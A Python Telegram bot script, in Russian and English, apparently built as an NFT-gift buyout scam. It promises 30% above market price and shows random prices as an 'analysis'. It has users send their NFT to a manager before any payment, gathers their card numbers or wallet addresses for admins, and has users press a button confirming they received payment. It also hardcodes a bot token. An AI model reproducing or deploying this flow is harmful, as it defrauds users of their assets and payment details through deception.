import logging
import re
import random
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)

# ==================== CONFIG ====================
BOT_TOKEN = "8760557568:AAFhxPzGyMbSuN7nSoYo1ZNJab0rxNwUJDk"
ADMIN_IDS = [174415647, 6765669825]
MANAGER = "@liiina_newq"

# ==================== STATES ====================
WAITING_NFT_LINK = 1
WAITING_PAYMENT_METHOD = 2
WAITING_REQUISITES = 3
WAITING_PAYMENT_CONFIRMATION = 4

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("nft_bot")

# ==================== ВАЛЮТЫ ПОД КАЖДЫЙ МЕТОД ====================
PAYMENT_CURRENCY = [
    ("USDT", "USDT"),     # 0 CryptoBot
    ("USDT", "USDT"),     # 1 TRC20
    ("TON", "TON"),       # 2 Tonkeeper
    ("STARS", "⭐"),      # 3 Telegram Stars
    ("UAH", "грн"),       # 4 Украина
    ("RUB", "руб"),       # 5 Россия
    ("USD", "$"),         # 6 США
    ("BYN", "руб"),       # 7 Беларусь
    ("KZT", "тг"),        # 8 Казахстан
    ("UZS", "сум"),       # 9 Узбекистан
    ("TRY", "₺"),         # 10 Турция
    ("AZN", "₼"),         # 11 Азербайджан
]

# Курсы к USD
RATES = {
    "USDT": 1,
    "TON": 0.19,
    "STARS": 0.0167,
    "UAH": 41,
    "RUB": 90,
    "USD": 1,
    "BYN": 3.2,
    "KZT": 480,
    "UZS": 12800,
    "TRY": 32,
    "AZN": 1.7,
}

# ==================== NFT ЦЕНЫ ====================
NFT_PRICES = {
    "plushpepe": 7500, "plush": 7500, "pepe": 7500,
    "dragon": 320, "crystal": 180, "gem": 180,
    "diamond": 260, "heart": 100, "star": 85,
    "loot": 120, "gold": 600, "cat": 24,
    "bear": 20, "dog": 16, "duck": 13,
    "bunny": 15, "jelly": 15, "santa": 11,
    "cake": 9, "wine": 9, "hat": 10, "gift": 11,
}

def get_price(nft_name):
    """Получает рыночную цену NFT и цену с наценкой 30%"""
    name_lower = nft_name.lower().replace("-", "").replace("_", "")
    
    for key, price in NFT_PRICES.items():
        if key in name_lower:
            our_price = round(price * 1.30, 2)
            return price, our_price
    
    # Если NFT не найдена, генерируем случайную цену
    base = round(random.uniform(10, 30), 2)
    our_price = round(base * 1.30, 2)
    return base, our_price

def convert_price(usd_amount, currency_code):
    """Конвертирует USD в указанную валюту"""
    rate = RATES.get(currency_code, 1)
    
    if currency_code == "TON":
        return round(usd_amount / 0.19, 2)
    elif currency_code == "STARS":
        return round(usd_amount / 0.0167)
    elif currency_code in ("USDT", "USD"):
        return round(usd_amount, 2)
    else:
        return round(usd_amount * rate, 0)

def format_price(amount, pay_idx):
    """Форматирует цену для отображения"""
    currency_code, currency_label = PAYMENT_CURRENCY[pay_idx]
    converted = convert_price(amount, currency_code)
    
    if currency_code == "USDT":
        return f"{converted} USDT"
    elif currency_code == "USD":
        return f"${converted}"
    elif currency_code == "TON":
        return f"{converted} TON"
    elif currency_code == "STARS":
        return f"{converted} ⭐"
    else:
        return f"{int(converted)} {currency_label}"

def is_nft_link(text):
    """Проверяет, является ли текст ссылкой на NFT"""
    return bool(re.match(r'https?://t\.me/nft/[\w\-]+', text.strip()))

def get_lang(context):
    """Получает язык пользователя"""
    return context.user_data.get("lang", "ru")

# ==================== TEXTS ====================
WELCOME_RU = (
    "🎁 *Добро пожаловать в скупку NFT-подарков!*\n\n"
    "Я покупаю NFT-подарки на *30% дороже рыночной цены* 📈\n\n"
    "💳 Доступные валюты: USDT, TON, Telegram Stars, RUB, UAH и другие\n\n"
    "Выберите действие ниже 👇"
)

WELCOME_EN = (
    "🎁 *Welcome to NFT Gift Buyout!*\n\n"
    "I buy NFT gifts at *30% above market price* 📈\n\n"
    "💳 Available currencies: USDT, TON, Telegram Stars, RUB, UAH and more\n\n"
    "Choose an action below 👇"
)

HOW_DEAL_RU = (
    "🤝 *Как проходит сделка:*\n\n"
    "1️⃣ Отправьте ссылку на ваш NFT-подарок\n"
    "2️⃣ Я проверю актуальную рыночную цену\n"
    "3️⃣ Выберите удобный способ оплаты\n"
    "4️⃣ Я покажу сумму в вашей валюте (+30% к рынку)\n"
    "5️⃣ Подтвердите сделку\n"
    "6️⃣ Отправьте NFT менеджеру\n"
    "7️⃣ Получите оплату и нажмите \"💸 Я оплатил\"\n\n"
    f"👤 Менеджер: {MANAGER}\n\n"
    "⚡ Среднее время сделки: 5-10 минут"
)

HOW_DEAL_EN = (
    "🤝 *How the deal works:*\n\n"
    "1️⃣ Send your NFT gift link\n"
    "2️⃣ I check the current market price\n"
    "3️⃣ Choose your payment method\n"
    "4️⃣ I show the amount in your currency (+30% above market)\n"
    "5️⃣ Confirm the deal\n"
    "6️⃣ Send NFT to the manager\n"
    "7️⃣ Receive payment and press \"💸 I paid\"\n\n"
    f"👤 Manager: {MANAGER}\n\n"
    "⚡ Average deal time: 5-10 minutes"
)

SELL_ASK_RU = (
    "🔗 *Отправьте ссылку на ваш NFT-подарок*\n\n"
    "Формат: `https://t.me/nft/Название-Номер`\n\n"
    "Пример: `https://t.me/nft/PlushPepe-12345`"
)

SELL_ASK_EN = (
    "🔗 *Send your NFT gift link*\n\n"
    "Format: `https://t.me/nft/Name-Number`\n\n"
    "Example: `https://t.me/nft/PlushPepe-12345`"
)

PAYMENT_RU = [
    "💎 CryptoBot (USDT)",
    "🔷 TRC20 (USDT)",
    "💎 Tonkeeper (TON)",
    "⭐ Telegram Stars",
    "🇺🇦 Карта Украина (UAH)",
    "🇷🇺 Карта Россия (RUB)",
    "🇺🇸 Карта США (USD)",
    "🇧🇾 Карта Беларусь (BYN)",
    "🇰🇿 Карта Казахстан (KZT)",
    "🇺🇿 Карта Узбекистан (UZS)",
    "🇹🇷 Карта Турция (TRY)",
    "🇦🇿 Карта Азербайджан (AZN)"
]

PAYMENT_EN = [
    "💎 CryptoBot (USDT)",
    "🔷 TRC20 (USDT)",
    "💎 Tonkeeper (TON)",
    "⭐ Telegram Stars",
    "🇺🇦 Card Ukraine (UAH)",
    "🇷🇺 Card Russia (RUB)",
    "🇺🇸 Card USA (USD)",
    "🇧🇾 Card Belarus (BYN)",
    "🇰🇿 Card Kazakhstan (KZT)",
    "🇺🇿 Card Uzbekistan (UZS)",
    "🇹🇷 Card Turkey (TRY)",
    "🇦🇿 Card Azerbaijan (AZN)"
]

# ==================== KEYBOARDS ====================
def language_keyboard():
    """Клавиатура выбора языка"""
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru"),
        InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")
    ]])

def main_keyboard(lang):
    """Главное меню"""
    if lang == "ru":
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("💰 Продать NFT", callback_data="menu_sell")],
            [InlineKeyboardButton("ℹ️ Как проходит сделка", callback_data="menu_how")],
            [InlineKeyboardButton("🆘 Связаться с поддержкой", callback_data="menu_support")]
        ])
    else:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("💰 Sell NFT", callback_data="menu_sell")],
            [InlineKeyboardButton("ℹ️ How it works", callback_data="menu_how")],
            [InlineKeyboardButton("🆘 Contact support", callback_data="menu_support")]
        ])

def payment_keyboard(lang):
    """Клавиатура выбора оплаты"""
    methods = PAYMENT_RU if lang == "ru" else PAYMENT_EN
    buttons = []
    
    # Создаем кнопки для каждого метода оплаты
    for i, method in enumerate(methods):
        callback = f"pay_{i}"
        buttons.append([InlineKeyboardButton(method, callback_data=callback)])
    
    # Кнопка назад
    back_text = "◀️ Назад в меню" if lang == "ru" else "◀️ Back to menu"
    buttons.append([InlineKeyboardButton(back_text, callback_data="back_to_main")])
    
    return InlineKeyboardMarkup(buttons)

def confirm_keyboard(lang):
    """Клавиатура подтверждения"""
    if lang == "ru":
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Да, согласен", callback_data="confirm_yes")],
            [InlineKeyboardButton("❌ Нет, отказаться", callback_data="confirm_no")]
        ])
    else:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Yes, I agree", callback_data="confirm_yes")],
            [InlineKeyboardButton("❌ No, cancel", callback_data="confirm_no")]
        ])

def deal_keyboard(lang):
    """Клавиатура для этапа сделки"""
    if lang == "ru":
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("💸 Я оплатил", callback_data="deal_paid")],
            [InlineKeyboardButton("🏠 В главное меню", callback_data="back_to_main")]
        ])
    else:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("💸 I paid", callback_data="deal_paid")],
            [InlineKeyboardButton("🏠 Main menu", callback_data="back_to_main")]
        ])

def back_keyboard(lang):
    """Клавиатура с кнопкой назад"""
    text = "🏠 В главное меню" if lang == "ru" else "🏠 Main menu"
    return InlineKeyboardMarkup([[InlineKeyboardButton(text, callback_data="back_to_main")]])

# ==================== HANDLERS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик команды /start"""
    context.user_data.clear()
    await update.message.reply_text(
        "🌍 Выберите язык / Choose language:",
        reply_markup=language_keyboard()
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик всех нажатий на кнопки"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    lang = context.user_data.get("lang", "ru")
    
    print(f"Нажата кнопка: {data}")  # Для отладки
    
    # ========== ВЫБОР ЯЗЫКА ==========
    if data == "lang_ru":
        context.user_data["lang"] = "ru"
        await query.edit_message_text(
            text=WELCOME_RU,
            parse_mode="Markdown",
            reply_markup=main_keyboard("ru")
        )
        return
    
    if data == "lang_en":
        context.user_data["lang"] = "en"
        await query.edit_message_text(
            text=WELCOME_EN,
            parse_mode="Markdown",
            reply_markup=main_keyboard("en")
        )
        return
    
    # ========== ВОЗВРАТ В ГЛАВНОЕ МЕНЮ ==========
    if data == "back_to_main":
        text = WELCOME_RU if lang == "ru" else WELCOME_EN
        await query.edit_message_text(
            text=text,
            parse_mode="Markdown",
            reply_markup=main_keyboard(lang)
        )
        context.user_data.clear()
        return
    
    # ========== КАК ПРОХОДИТ СДЕЛКА ==========
    if data == "menu_how":
        text = HOW_DEAL_RU if lang == "ru" else HOW_DEAL_EN
        await query.edit_message_text(
            text=text,
            parse_mode="Markdown",
            reply_markup=back_keyboard(lang)
        )
        return
    
    # ========== ПОДДЕРЖКА ==========
    if data == "menu_support":
        if lang == "ru":
            text = f"🆘 *Поддержка*\n\nПо всем вопросам обращайтесь к менеджеру:\n{MANAGER}"
        else:
            text = f"🆘 *Support*\n\nFor all questions, contact the manager:\n{MANAGER}"
        await query.edit_message_text(
            text=text,
            parse_mode="Markdown",
            reply_markup=back_keyboard(lang)
        )
        return
    
    # ========== ПРОДАЖА NFT ==========
    if data == "menu_sell":
        context.user_data["state"] = WAITING_NFT_LINK
        text = SELL_ASK_RU if lang == "ru" else SELL_ASK_EN
        await query.edit_message_text(
            text=text,
            parse_mode="Markdown",
            reply_markup=back_keyboard(lang)
        )
        return
    
    # ========== ВЫБОР СПОСОБА ОПЛАТЫ ==========
    if data.startswith("pay_"):
        try:
            idx = int(data.split("_")[1])
            context.user_data["pay_idx"] = idx
            context.user_data["payment"] = (PAYMENT_RU if lang == "ru" else PAYMENT_EN)[idx]
            context.user_data["state"] = WAITING_REQUISITES
            
            nft_link = context.user_data.get("nft_link", "NFT")
            our_price = context.user_data.get("our_price", 0)
            price_str = format_price(our_price, idx)
            
            if lang == "ru":
                text = (
                    f"💳 *Выбранный способ:* {context.user_data['payment']}\n\n"
                    f"📎 *NFT:* `{nft_link}`\n"
                    f"💰 *Сумма к выплате:* {price_str}\n\n"
                    f"📝 *Введите ваши реквизиты* для получения оплаты\n"
                    f"(номер карты, адрес кошелька и т.д.):"
                )
            else:
                text = (
                    f"💳 *Selected method:* {context.user_data['payment']}\n\n"
                    f"📎 *NFT:* `{nft_link}`\n"
                    f"💰 *Payout amount:* {price_str}\n\n"
                    f"📝 *Enter your payment details*\n"
                    f"(card number, wallet address, etc.):"
                )
            
            await query.edit_message_text(
                text=text,
                parse_mode="Markdown",
                reply_markup=back_keyboard(lang)
            )
        except Exception as e:
            logger.error(f"Ошибка в pay_: {e}")
        return
    
    # ========== ПОДТВЕРЖДЕНИЕ "ДА" ==========
    if data == "confirm_yes":
        nft_link = context.user_data.get("nft_link", "")
        our_price = context.user_data.get("our_price", 0)
        pay_idx = context.user_data.get("pay_idx", 0)
        price_str = format_price(our_price, pay_idx)
        payment = context.user_data.get("payment", "")
        requisites = context.user_data.get("requisites", "")
        
        if lang == "ru":
            text = (
                f"✅ *Сделка подтверждена!*\n\n"
                f"📎 *NFT:* `{nft_link}`\n"
                f"💰 *Сумма:* {price_str}\n"
                f"💳 *Способ:* {payment}\n"
                f"📝 *Реквизиты:* `{requisites}`\n\n"
                f"📤 *Отправьте ваш NFT менеджеру:* {MANAGER}\n\n"
                f"После того как менеджер отправит оплату, нажмите кнопку ниже 👇"
            )
        else:
            text = (
                f"✅ *Deal confirmed!*\n\n"
                f"📎 *NFT:* `{nft_link}`\n"
                f"💰 *Amount:* {price_str}\n"
                f"💳 *Method:* {payment}\n"
                f"📝 *Details:* `{requisites}`\n\n"
                f"📤 *Send your NFT to manager:* {MANAGER}\n\n"
                f"After the manager sends payment, press the button below 👇"
            )
        
        await query.edit_message_text(
            text=text,
            parse_mode="Markdown",
            reply_markup=deal_keyboard(lang)
        )
        context.user_data["state"] = WAITING_PAYMENT_CONFIRMATION
        
        # Уведомление админам
        user = query.from_user
        admin_text = (
            f"🔔 *НОВАЯ СДЕЛКА!*\n"
            f"👤 Пользователь: @{user.username or user.id} (ID: {user.id})\n"
            f"📎 NFT: {nft_link}\n"
            f"💰 Сумма: {price_str}\n"
            f"💳 Метод: {payment}\n"
            f"📝 Реквизиты: {requisites}"
        )
        for admin_id in ADMIN_IDS:
            try:
                await context.bot.send_message(admin_id, admin_text, parse_mode="Markdown")
            except Exception as e:
                logger.error(f"Не удалось отправить админу {admin_id}: {e}")
        return
    
    # ========== ПОДТВЕРЖДЕНИЕ "НЕТ" ==========
    if data == "confirm_no":
        if lang == "ru":
            text = "❌ Сделка отменена. Возвращаю в главное меню."
        else:
            text = "❌ Deal cancelled. Returning to main menu."
        
        await query.edit_message_text(
            text=text,
            parse_mode="Markdown",
            reply_markup=back_keyboard(lang)
        )
        context.user_data.clear()
        return
    
    # ========== КНОПКА "Я ОПЛАТИЛ" ==========
    if data == "deal_paid":
        nft_link = context.user_data.get("nft_link", "")
        our_price = context.user_data.get("our_price", 0)
        pay_idx = context.user_data.get("pay_idx", 0)
        price_str = format_price(our_price, pay_idx)
        
        if lang == "ru":
            text = (
                f"💸 *Спасибо за подтверждение!*\n\n"
                f"Менеджер {MANAGER} уже получил уведомление о том, что вы получили оплату.\n\n"
                f"📎 NFT: `{nft_link}`\n"
                f"💰 Сумма: {price_str}\n\n"
                f"Если у вас возникнут вопросы, обратитесь к менеджеру."
            )
        else:
            text = (
                f"💸 *Thank you for confirmation!*\n\n"
                f"Manager {MANAGER} has been notified that you received payment.\n\n"
                f"📎 NFT: `{nft_link}`\n"
                f"💰 Amount: {price_str}\n\n"
                f"If you have any questions, contact the manager."
            )
        
        await query.edit_message_text(
            text=text,
            parse_mode="Markdown",
            reply_markup=back_keyboard(lang)
        )
        
        # Уведомление админам
        user = query.from_user
        admin_text = (
            f"💰 *ПОДТВЕРЖДЕНИЕ ОПЛАТЫ!*\n"
            f"👤 Пользователь: @{user.username or user.id} (ID: {user.id})\n"
            f"📎 NFT: {nft_link}\n"
            f"💰 Сумма: {price_str}\n"
            f"✅ Пользователь подтвердил получение оплаты"
        )
        for admin_id in ADMIN_IDS:
            try:
                await context.bot.send_message(admin_id, admin_text, parse_mode="Markdown")
            except Exception as e:
                logger.error(f"Не удалось отправить админу {admin_id}: {e}")
        
        context.user_data.clear()
        return

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик текстовых сообщений"""
    state = context.user_data.get("state")
    lang = context.user_data.get("lang", "ru")
    text = update.message.text.strip()
    
    # ========== ОЖИДАНИЕ ССЫЛКИ НА NFT ==========
    if state == WAITING_NFT_LINK:
        if not is_nft_link(text):
            if lang == "ru":
                err = "❌ *Ошибка!* Это не похоже на ссылку NFT-подарка.\n\nОтправьте ссылку в формате:\n`https://t.me/nft/Название-Номер`"
            else:
                err = "❌ *Error!* This doesn't look like an NFT gift link.\n\nSend a link in format:\n`https://t.me/nft/Name-Number`"
            await update.message.reply_text(err, parse_mode="Markdown")
            return
        
        # Получаем название NFT из ссылки
        nft_name = text.split("/nft/")[-1].split("-")[0]
        
        # Получаем рыночную цену
        market_price, our_price = get_price(nft_name)
        
        context.user_data["nft_link"] = text
        context.user_data["market_price"] = market_price
        context.user_data["our_price"] = our_price
        context.user_data["state"] = WAITING_PAYMENT_METHOD
        
        if lang == "ru":
            msg = (
                f"🔍 *Анализ NFT завершен!*\n\n"
                f"📎 *Ссылка:* `{text}`\n"
                f"📊 *Рыночная цена:* ${market_price}\n"
                f"💰 *Наше предложение:* ${our_price} (+30%)\n\n"
                f"Выберите способ получения оплаты ниже 👇"
            )
        else:
            msg = (
                f"🔍 *NFT Analysis Complete!*\n\n"
                f"📎 *Link:* `{text}`\n"
                f"📊 *Market Price:* ${market_price}\n"
                f"💰 *Our Offer:* ${our_price} (+30%)\n\n"
                f"Choose payment method below 👇"
            )
        
        await update.message.reply_text(
            text=msg,
            parse_mode="Markdown",
            reply_markup=payment_keyboard(lang)
        )
        return
    
    # ========== ОЖИДАНИЕ РЕКВИЗИТОВ ==========
    if state == WAITING_REQUISITES:
        context.user_data["requisites"] = text
        context.user_data["state"] = None
        
        nft_link = context.user_data.get("nft_link", "")
        our_price = context.user_data.get("our_price", 0)
        market_price = context.user_data.get("market_price", 0)
        pay_idx = context.user_data.get("pay_idx", 0)
        payment = context.user_data.get("payment", "")
        
        price_str = format_price(our_price, pay_idx)
        market_str = format_price(market_price, pay_idx)
        
        if lang == "ru":
            msg = (
                f"📋 *Итог сделки:*\n\n"
                f"📎 *NFT:* `{nft_link}`\n"
                f"💳 *Способ оплаты:* {payment}\n"
                f"📊 *Рыночная цена:* {market_str}\n"
                f"💰 *Сумма к выплате:* {price_str}\n"
                f"📝 *Ваши реквизиты:* `{text}`\n\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"💬 Я предлагаю вам за ваш NFT `{nft_link}` сумму *{price_str}*\n\n"
                f"Подтверждаете сделку?"
            )
        else:
            msg = (
                f"📋 *Deal Summary:*\n\n"
                f"📎 *NFT:* `{nft_link}`\n"
                f"💳 *Payment Method:* {payment}\n"
                f"📊 *Market Price:* {market_str}\n"
                f"💰 *Payout Amount:* {price_str}\n"
                f"📝 *Your Details:* `{text}`\n\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"💬 I offer you for your NFT `{nft_link}` the amount *{price_str}*\n\n"
                f"Do you confirm the deal?"
            )
        
        await update.message.reply_text(
            text=msg,
            parse_mode="Markdown",
            reply_markup=confirm_keyboard(lang)
        )
        return

def main():
    """Запуск бота"""
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Регистрируем обработчики
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    
    print("✅ Бот успешно запущен!")
    print(f"👤 Менеджер: {MANAGER}")
    print(f"👥 Админы: {ADMIN_IDS}")
    print("🔄 Кнопки должны работать")
    
    app.run_polling()

if __name__ == "__main__":
    main()
